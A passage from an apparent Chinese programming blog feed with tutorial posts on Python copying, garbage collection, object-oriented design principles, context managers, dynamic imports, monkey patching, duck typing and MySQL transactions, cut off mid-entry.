3], (30, 40), 100]</span><br><span class="hljs-built_in">print</span>(l2)  <span class="hljs-comment"># [[1, 2, 3], (30, 40)]</span><br><br>l1[<span class="hljs-number">1</span>] += (<span class="hljs-number">50</span>, <span class="hljs-number">60</span>)  <span class="hljs-comment"># 元组为不可变对象，此处会在l1中创建一个新元组，l1改变，l2不变</span><br><span class="hljs-built_in">print</span>(l1)  <span class="hljs-comment"># [[1, 2, 3], (30, 40, 50, 60), 100]</span><br><span class="hljs-built_in">print</span>(l2)  <span class="hljs-comment"># [[1, 2, 3], (30, 40)]</span><br></code></pre></td></tr></table></figure><p>如果想避免浅拷贝的副作用，完整地拷贝一个对象，可以使用深度拷贝。另外，深度拷贝中会维护一个字典，记录已经拷贝的对象及其 ID，来提高效率并防止无限递归的发生。</p><p><strong>示例三：创建深拷贝</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> copy<br><br>l1 = [[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>], (<span class="hljs-number">30</span>, <span class="hljs-number">40</span>)]<br>l2 = copy.deepcopy(l1)  <span class="hljs-comment"># 使用deepcopy函数创建深拷贝</span><br>l1.append(<span class="hljs-number">100</span>)<br>l1[<span class="hljs-number">0</span>].append(<span class="hljs-number">3</span>)<br><br><span class="hljs-built_in">print</span>(l1)  <span class="hljs-comment"># [[1, 2, 3], (30, 40), 100]</span><br><span class="hljs-built_in">print</span>(l2)  <span class="hljs-comment"># [[1, 2], (30, 40)]</span><br></code></pre></td></tr></table></figure><p><strong>示例四：无限嵌套列表</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 在下面的代码中，最后x和len(x)的输出是什么？</span><br>x = [<span class="hljs-number">1</span>]<br>x.append(x)<br><br><span class="hljs-built_in">print</span>(x)  <span class="hljs-comment"># [1, [...]]</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(x))  <span class="hljs-comment"># 2</span><br><br>---------<br><span class="hljs-comment"># 以下代码的输出是什么？</span><br><span class="hljs-keyword">import</span> copy<br><br>x = [<span class="hljs-number">1</span>]<br>x.append(x)<br><br>y = copy.deepcopy(x)<br><br><span class="hljs-built_in">print</span>(x == y)  <span class="hljs-comment"># RecursionError: maximum recursion depth exceeded in comparison</span><br></code></pre></td></tr></table></figure><p><img src="/img/Python/001a607f3f29f68975be3e706711325f.png"></p><p>题目一中，x 指向一个列表，列表的第一个元素为 1。执行了 append 操作后，第二个元素又反过来指向 x，即指向了 x 所指向的列表，因此形成了一个无限嵌套的循环：[1, [1, [1, [1, …]]]]。不过，虽然 x 是无限嵌套的列表，但 x.append(x) 的操作，并不会递归遍历其中的每一个元素。它只是扩充了原列表的第二个元素，并将其指向 x，因此不会出现 stack overflow 的问题。虽然 x 是无限嵌套的列表，但 x 实际只有 2 个元素组成，第一个元素为 1，第二个元素为指向自身的列表，因此 len(x) 返回 2。</p><p>题目二中，x 是一个无限嵌套的列表，y 是 x 的深度拷贝，按道理来讲 <code>x == y</code> 应该是为 <code>True</code> 的。但使用比较操作符 “==” 进行比较的时候，“==” 操作符会递归地遍历对象的所有值，并逐一比较。此时，因为 x、y 是无限嵌套列表，当达到递归深度时程序便会抛出 <code>RecursionError</code> 异常。</p><h2 id="del-语句和引用计数"><a href="#del-语句和引用计数" class="headerlink" title="del 语句和引用计数"></a>del 语句和引用计数</h2><p>为了简化内存管理，Python 通过 <strong>引用计数</strong> 机制实现自动垃圾回收功能。Python 中的每个对象都有一个对应的引用计数，用来记录该对象在不同场所分别被引用了多少次。每引用一次对象，相应的引用计数就会加 1，每销毁一次对象，则相应的引用就会减 1。</p><p>执行 <strong>del 语句</strong> 可以删除对象的引用（不会删除对象），使对象的引用计数减少。当对象的引用计数为 0 时，Python 内部的自动垃圾回收机制（GC）会将此对象所占用的内存收回，此时才真正从内存中删除这个对象。</p><blockquote><p>使用 <code>sys.getrefcount(object)</code> 方法，获得一个对象的引用计数。（此函数调用时会增加一次引用计数）</p></blockquote><p><strong>示例：释放循环引用的对象</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gc<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, x</span>):</span><br>        self.a = x<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__del__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;del class A&#x27;</span>)<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>        self.b = A(self)  <span class="hljs-comment"># A和B互相引用</span><br>        <span class="hljs-comment"># del self.b  # 若注释掉此行，test函数退出后，B对象不会释放</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__del__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;del class B&#x27;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>():</span><br>    B()<br><br><br>test()<br><span class="hljs-comment"># gc.collect()  # 显式启动垃圾回收，也可以解决循环引用问题</span><br><span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Enter any key to exit.&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="标记清除和分代收集"><a href="#标记清除和分代收集" class="headerlink" title="标记清除和分代收集"></a>标记清除和分代收集</h2><p>Python 使用 <strong>标记清除算法（mark-sweep）</strong> 和 <strong>分代收集算法（generational）</strong>，来启用针对循环引用的自动垃圾回收。</p><p><strong>标记清除</strong></p><p>我们先用图论来理解不可达的概念。对于一个有向图，如果从一个节点出发进行遍历，并标记其经过的所有节点；那么，在遍历结束后，所有没有被标记的节点，我们就称之为不可达节点。显而易见，这些节点的存在是没有任何意义的，自然的，我们就需要对它们进行垃圾回收。</p><p>当然，每次都遍历全图，对于 Python 而言是一种巨大的性能浪费。所以，在 Python 的垃圾回收实现中，mark-sweep 使用双向链表维护了一个数据结构，并且只考虑容器类的对象（只有容器类对象才有可能产生循环引用）。</p><p><strong>分代收集</strong></p><p>Python 将所有对象分为三代。刚刚创立的对象是第 0 代；经过一次垃圾回收后，依然存在的对象，便会依次从上一代挪到下一代。而每一代启动自动垃圾回收的阈值，则是可以单独指定的。当垃圾回收器中新增对象减去删除对象达到相应的阈值时，就会对这一代对象启动垃圾回收。</p><p>分代收集基于的思想是：新生的对象更有可能被垃圾回收，而存活更久的对象也有更高的概率继续存活。因此，通过这种做法，可以节约不少计算量，从而提高 Python 的性能。</p>]]></content>
    
    
    <categories>
      
      <category>后端开发</category>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python3</tag>
      
      <tag>垃圾回收</tag>
      
      <tag>引用计数</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>面向对象编程与设计原则</title>
    <link href="/post/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B%E4%B8%8E%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99/"/>
    <url>/post/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B%E4%B8%8E%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99/</url>
    
    <content type="html"><![CDATA[<p>思从深而行从简，真正的高手能云淡风轻地用最简单的方法解决最复杂的问题。</p><h2 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h2><p><strong>面向对象编程（Object Oriented Programming，OOP）</strong>是一种编程范式或编程风格，它以 <strong>类（class）</strong> 或 <strong>对象（object）</strong> 作为组织代码的基本单元，并将 <strong>封装、抽象、继承、多态</strong> 四个特性作为代码设计和实现的基石。</p><p>与面向对象编程经常放到一起的还有另外两个概念，那就是 <strong>面向对象分析（Object Oriented Analysis，OOA）</strong> 和 <strong>面向对象设计（Object Oriented Design，OOD）</strong>。面向对象分析就是要搞清楚做什么，面向对象设计就是要搞清楚怎么做，两个阶段最终的产出是类的设计。包括程序被拆解为哪些类，每个类有哪些属性方法、类与类之间如何交互等等。OOA、OOD、OOP 三个连在一起就是 <strong>面向对象分析、设计、编程（实现）</strong>，正好是面向对象软件开发要经历的 <strong>三个阶段</strong>。</p><h3 id="封装（Encapsulation）"><a href="#封装（Encapsulation）" class="headerlink" title="封装（Encapsulation）"></a>封装（Encapsulation）</h3><p>封装也叫作 <strong>信息隐藏</strong> 或 <strong>数据访问保护</strong>。类通过暴露有限的访问接口，授权外部仅能通过类提供的方法来访问类内部信息或数据。封装需要编程语言提供权限访问控制语法来支持，例如 Java 中的 private、protected、public 关键字。封装特性存在的意义，一方面是保护数据不被随意修改，<strong>提高代码的可维护性</strong>；另一方面是仅暴露有限的必要接口，<strong>提高类的易用性</strong>。</p><h3 id="抽象（Abstraction）"><a href="#抽象（Abstraction）" class="headerlink" title="抽象（Abstraction）"></a>抽象（Abstraction）</h3><p>抽象的作用是 <strong>隐藏方法的具体实现</strong>。让调用者只需要关心方法提供了哪些功能，而不需要知道这些功能是如何实现的。抽象可以通过接口类或者抽象类来实现，不需要特殊的语法机制来支持。抽象特性存在的意义，一方面是 <strong>提高代码的可扩展性、维护性</strong>，修改实现不需要改变定义，减少代码的改动范围；另一方面，它也是 <strong>处理复杂系统的有效手段</strong>，能有效地过滤掉不必要关注的信息。</p><h3 id="继承（Inheritance）"><a href="#继承（Inheritance）" class="headerlink" title="继承（Inheritance）"></a>继承（Inheritance）</h3><p>继承用于 <strong>表示类之间的 is-a 关系</strong>，分为两种模式：<strong>单</strong> 继承和 <strong>多</strong> 继承。单继承表示一个子类只继承一个父类，多继承表示一个子类可以继承多个父类。为了实现继承这个特性，编程语言需要提供特殊的语法机制来支持。继承主要是用来 <strong>解决代码复用的问题</strong>。</p><h3 id="多态（Polymorphism）"><a href="#多态（Polymorphism）" class="headerlink" title="多态（Polymorphism）"></a>多态（Polymorphism）</h3><p>多态是指 <strong>为不同数据类型的实体提供统一的接口</strong>，可以在运行时根据上下文来改变类的性质和行为。多态这种特性也需要编程语言提供特殊的语法机制来实现，比如继承、接口类、duck-typing。多态可以 <strong>提高代码的扩展性和复用性</strong>，是很多设计模式、设计原则、编程技巧的代码实现基础。</p><h2 id="设计原则"><a href="#设计原则" class="headerlink" title="设计原则"></a>设计原则</h2><h3 id="SOLID-原则"><a href="#SOLID-原则" class="headerlink" title="SOLID 原则"></a>SOLID 原则</h3><ul><li>S - 单一职责原则（Single Responsibility Principle，SRP）：一个类或者模块只负责完成一个功能；</li><li>O - 开闭原则（Open Closed Principle，OCP）：软件实体（模块、类、方法等）应该对扩展开放，对修改关闭；</li><li>L - 里式替换原则（Liskov Substitution Principle，LSP）：子类对象能够替换程序中父类对象出现的任何地方，并且保证程序的逻辑不变；</li><li>I - 接口隔离原则（Interface Segregation Principle，ISP）：客户端不应该被强迫依赖它不需要的接口；</li><li>D - 依赖反转原则（Dependency Inversion Principle，DIP）：（框架设计）高层模块不要依赖低层模块，而应该通过抽象互相依赖。</li></ul><h3 id="KISS-原则"><a href="#KISS-原则" class="headerlink" title="KISS 原则"></a>KISS 原则</h3><ul><li>Keep It Simple and Stupid.</li><li>Keep It Short and Simple.</li><li>Keep It Simple and Straightforward.</li></ul><p>不要使用同事可能不懂的技术，不要重复造轮子，不要过度优化，<strong>尽量保持简单</strong>。（解决如何做）</p><h3 id="YAGNI-原则"><a href="#YAGNI-原则" class="headerlink" title="YAGNI 原则"></a>YAGNI 原则</h3><ul><li>You Ain’t Gonna Need It.</li></ul><p>不要去设计当前用不到的功能，不要去编写当前用不到的代码，<strong>不要做过度设计</strong>。（解决要不要做）</p><h3 id="DRY-原则"><a href="#DRY-原则" class="headerlink" title="DRY 原则"></a>DRY 原则</h3><ul><li>Don’t Repeat Yourself.</li></ul><p>不要写重复的代码，提高代码复用性。</p>]]></content>
    
    
    <categories>
      
      <category>后端开发</category>
      
      <category>通用技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>面向对象</tag>
      
      <tag>设计原则</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python 进阶技巧</title>
    <link href="/post/Python%E8%BF%9B%E9%98%B6%E6%8A%80%E5%B7%A7/"/>
    <url>/post/Python%E8%BF%9B%E9%98%B6%E6%8A%80%E5%B7%A7/</url>
    
    <content type="html"><![CDATA[<p>本文介绍了 Python 中一些较为高级但实际很常用的技巧，包括上下文管理器、动态导入、猴子补丁、鸭子类型。</p><h2 id="上下文管理器"><a href="#上下文管理器" class="headerlink" title="上下文管理器"></a>上下文管理器</h2><p>在任何一门编程语言中，文件的输入输出、数据库的连接断开、互斥锁的获得释放等，都是很常见的资源管理操作。但资源都是有限的，在写程序时，我们必须保证这些资源在使用过后得到释放，不然就容易造成资源泄露，轻则使得系统处理缓慢，重则会使系统崩溃。</p><p>为了解决这个问题，不同的编程语言都引入了不同的机制。而在 Python 中，对应的解决方式便是 <strong>上下文管理器（context manager）</strong>，它可以确保用过的资源得到迅速释放，有效提高了程序的安全性。上下文管理器通常和 <strong>with 语句</strong> 一起使用，可以在极大程度上简化代码，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-string">&#x27;hello world&#x27;</span>)<br><br><span class="hljs-comment"># 上面的代码等同于</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">try</span>:<br>    f.write(<span class="hljs-string">&#x27;hello&#x27;</span>)<br><span class="hljs-keyword">finally</span>:<br>    f.close()<br></code></pre></td></tr></table></figure><p><strong>示例：基于类的上下文管理器</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileManager</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, name, mode</span>):</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;call __init__ method&#x27;</span>)<br><br>        self.name = name<br>        self.mode = mode<br>        self.file = <span class="hljs-literal">None</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__enter__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-comment"># 返回需要被管理的资源</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;call __enter__ method&#x27;</span>)<br><br>        self.file = <span class="hljs-built_in">open</span>(self.name, self.mode)<br>        <span class="hljs-keyword">return</span> self.file<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__exit__</span>(<span class="hljs-params">self, exc_type, exc_val, exc_tb</span>):</span><br>        <span class="hljs-comment"># 一些释放、清理资源的操作</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;call __exit__ method&#x27;</span>)<br><br>        <span class="hljs-keyword">if</span> self.file:<br>            self.file.close()<br><br><br><span class="hljs-keyword">with</span> FileManager(<span class="hljs-string">&#x27;test.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ready to write to file&#x27;</span>)<br>    f.write(<span class="hljs-string">&#x27;hello world&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="动态导入"><a href="#动态导入" class="headerlink" title="动态导入"></a><a href="https://docs.python.org/zh-cn/3/library/importlib.html">动态导入</a></h2><p><code>__import__()</code> 内置函数用于动态加载类和函数，如果一个模块经常变化就可以使用 <code>__import__()</code> 来动态载入，问题是只会导入最高级的包或模块。</p><p><code>importlib</code> 库的目的有两个：第一个目的是在 Python 源代码中提供 <code>import</code> 语句的实现（扩展了 <code>__import__()</code> 函数），第二个目的是使用户更容易导入他们的自定义模块。</p><ul><li><code>importlib.import_module(name, package=None)</code><ul><li>导入一个模块。</li><li>参数 <em>name</em> 指定了以绝对或相对导入方式导入什么模块（比如 <code>pkg.mod</code> 或 <code>..mod</code>）。</li><li>如果参数 <em>name</em> 使用相对导入方式，那么必须指定参数 <em>packages</em> 为要导入的包名，这个包名作为解析这个包名的锚点（比如 <code>import_module(..mod, pkg.subpkg)</code> 将会导入 <code>pkg.mod</code>）。</li></ul></li><li><code>importlib.reload(module)</code><ul><li>重新加载之前导入的模块。</li><li>参数 <em>module</em> 必须是一个之前已经成功导入过的模块对象。</li></ul></li></ul><p><strong>示例：动态加载插件</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> importlib <span class="hljs-keyword">import</span> import_module, reload<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">loading</span>(<span class="hljs-params">plugin_name</span>):</span><br>    <span class="hljs-keyword">try</span>:<br>        plugin = import_module(<span class="hljs-string">f&#x27;.<span class="hljs-subst">&#123;plugin_name&#125;</span>&#x27;</span>, package=<span class="hljs-string">&#x27;test&#x27;</span>)<br>        <span class="hljs-comment"># plugin = reload(plugin)  # reload module</span><br>        poc = <span class="hljs-built_in">getattr</span>(plugin, <span class="hljs-string">&#x27;poc&#x27;</span>)<br>        poc()<br>    <span class="hljs-keyword">except</span> (ModuleNotFoundError, AttributeError) <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br><br><br>loading(<span class="hljs-string">&#x27;payload&#x27;</span>)  <span class="hljs-comment"># 动态导入test目录下的payload.py文件</span><br></code></pre></td></tr></table></figure><h2 id="猴子补丁"><a href="#猴子补丁" class="headerlink" title="猴子补丁"></a>猴子补丁</h2><p><strong>猴子补丁（Monkey Patch）</strong>，也叫做 <strong>热补丁、程序运行过程中的补丁</strong>，允许在运行期间动态修改一个类或模块。</p><p>如果是自己写的代码，Monkey Patch 就毫无意义了，直接改源码就可以，Monkey Patch 的主要用途在于<strong>源码不宜直接修改</strong>。比如你要修复一个第三方 module 的 bug 或者进行特定的修改、扩展，通常来说有下面几种做法:</p><ol><li>直接把源 package/module，复制一份到当前项目中，再改源码。但不推荐，因为会导致当前的项目代码管理上的混乱。</li><li>向原作者提 pull request，以修正 bug 或者其他。应该如此，但未必能联系到对方，联系到了对方未必修改，修改了未必很快能用上。</li></ol><p>这个时候 Monkey Patch 的价值就出来了，不用改原始的 module 源码，就能达到自己期望的效果。代码示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># monkey_patch.py</span><br><span class="hljs-keyword">import</span> requests<br><br>base_get = requests.get  <span class="hljs-comment"># 保留原始函数</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">monkey_get</span>(<span class="hljs-params">a</span>):</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;this is a test&#x27;</span>)  <span class="hljs-comment"># 增加自己的逻辑</span><br>    <span class="hljs-keyword">return</span> base_get(a)  <span class="hljs-comment"># 调用原始函数</span><br><br><br>requests.get = monkey_get  <span class="hljs-comment"># 覆盖原始函数</span><br><br>---------<br><span class="hljs-comment"># test.py</span><br><span class="hljs-keyword">import</span> requests<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send</span>():</span><br>    <span class="hljs-built_in">print</span>(requests.get(<span class="hljs-string">&#x27;http://www.baidu.com&#x27;</span>))<br><br>---------<br><span class="hljs-comment"># run.py</span><br><span class="hljs-keyword">import</span> monkey_patch  <span class="hljs-comment"># 不导入monkey_patch，则执行原module的逻辑</span><br><span class="hljs-keyword">from</span> test <span class="hljs-keyword">import</span> send<br><br>send()<br></code></pre></td></tr></table></figure><h2 id="鸭子类型"><a href="#鸭子类型" class="headerlink" title="鸭子类型"></a>鸭子类型</h2><blockquote><p>当看到一只鸟走起来像鸭子、游泳起来像鸭子、叫起来也像鸭子，那么这只鸟就可以被称为鸭子。</p></blockquote><p><strong>鸭子类型（Duck Typing）</strong>是动态类型的一种风格。在这种风格中，一个对象有效的语义，不是由继承自特定的类或实现特定的接口决定，而是由“当前方法和属性的集合”决定。鸭子类型在动态语言中常常使用，<strong>是用来实现多态的一种方式</strong>。</p><p><strong>示例：使用 duck typing 实现多态</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Eagle</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fly</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.__class__.__name__&#125;</span> flying.&#x27;</span>)<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pigeon</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fly</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.__class__.__name__&#125;</span> flying.&#x27;</span>)<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Duck</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fly</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.__class__.__name__&#125;</span> can not fly.&#x27;</span>)<br><br><br><span class="hljs-keyword">for</span> bird <span class="hljs-keyword">in</span> [Eagle, Pigeon, Duck]:<br>    bird().fly()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>后端开发</category>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python3</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>详解 MySQL 事务</title>
    <link href="/post/%E8%AF%A6%E8%A7%A3MySQL%E4%BA%8B%E5%8A%A1/"/>
    <url>/post/%E8%AF%A6%E8%A7%A3MySQL%E4%BA%8B%E5%8A%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="事务定义"><a href="#事务定义" class="headerlink" title="事务定义"></a>事务定义</h2><p><strong>事务（Transaction）</strong> 是一个最小的、不可再分的工作单元，通常对应着一个完整的业务过程（需要使用多条 SQL 语句共同完成），以保证成批的 SQL 语句要么全部执行，要么全部不执行（即将多个语句视为一个语句）。简单来说，<strong>事务就是要保证一组数据库操作，要么全部成功，要么全部失败。</strong></p><p>在 MySQL 中，事务支持是在 <strong>引擎层</strong> 实现的，只有使用了 <strong>InnoDB</strong> 引擎的数据库或表才支持事务。</p><h2 id="事务四大属性"><a href="#事务四大属性" class="headerlink" title="事务四大属性"></a>事务四大属性</h2><p>一般来说，事务必须满足四个条件，也就是事务的 ACID 属性： </p><ul><li>原子性（Atomicity）：事务是一个最小单元，不可再分，一个事务中的所有操作，要么全部完成，要么全部不完成，不会结束在中间某个环节。</li><li>一致性（Consistency）：在事务执行前和执行后，数据库的状态应保持一致。比如，A 向 B 转账，不可能 A 扣了钱，B 却没有收到。</li><li>隔离性（Isolation）：数据库允许多个并发事务同时对其数据进行读写和修改的能力，隔离性可以防止多个事务并发执行时由于交叉执行而导致的数据不一致。</li><li>持久性（Durability）：事务执行结束并提交后，对数据的修改就是永久的，即使系统故障数据也不会丢失。</li></ul><h2 id="事务分类"><a href="#事务分类" class="headerlink" title="事务分类"></a>事务分类</h2><h3 id="显式事务"><a href="#显式事务" class="headerlink" title="显式事务"></a>显式事务</h3><p>具有明显的开启和结束事务的标志：</p><ol><li>使用 <code>begin</code> 或 <code>start transaction</code> 启动事务，使用 <code>commit</code> 或 <code>rollback</code> 结束事务；</li><li>执行 <code>set autocommit=0</code> 命令，关闭线程的自动提交，然后执行的 SQL 语句都将添加到一个事务中，并且不会自动提交。这个事务会持续存在直到执行 <code>commit</code> 或 <code>rollback</code> 语句，或者断开数据库连接。</li></ol><p>需要注意的是 <code>begin/start transaction</code> 命令并不是一个事务的起点，在执行到它们之后的第一个操作 InnoDB 表的语句时，事务才会真正启动。如果你想要马上启动一个事务，可以使用 <code>starttransaction with consistent snapshot</code> 这个命令。</p><blockquote><p>建议在 set autocommit 为 1 的情况下，使用第一种方式显示开启事务。避免使用 <code>set autocommit=0</code> 命令，因为这可能会导致意外的长事务。</p></blockquote><h3 id="隐式事务"><a href="#隐式事务" class="headerlink" title="隐式事务"></a>隐式事务</h3><p>没有明显的开启和结束事务的标志：</p><ol><li>在默认情况下，由于 MySQL 默认开启了事务自动提交（<code>autocommit=1</code>），所以每个 DML 语句实际上会隐式开始一个新事务，如<code>insert</code>、<code>update</code>、<code>delete</code> 语句本身就是一个事务。</li><li>几乎所有 <strong>非 DQL、DML 语句</strong> 在执行时都会导致 <a href="https://dev.mysql.com/doc/refman/5.6/en/implicit-commit.html">隐式提交</a>，会结束当前进行中的事务，并且无视 autocommit 状态。</li></ol><h2 id="事务控制语言"><a href="#事务控制语言" class="headerlink" title="事务控制语言"></a>事务控制语言</h2><p>TCL（Transaction Control Language，事务控制语言）：</p><ul><li><code>begin</code> 或 <code>start transaction</code>：显式开始一个事务</li><li><code>commit</code>：结束并提交事务，永久记录当前事务所做的更改</li><li><code>rollback</code>：结束并回滚事务，撤销当前事务所做的更改</li><li><code>savepoint n</code>：在事务中创建一个标记点（一个事务可以创建多个标记点）</li><li><code>rollback to n</code>：事务回滚到标记点</li><li><code>release savepoint n</code>：删除一个标记点</li></ul><h2 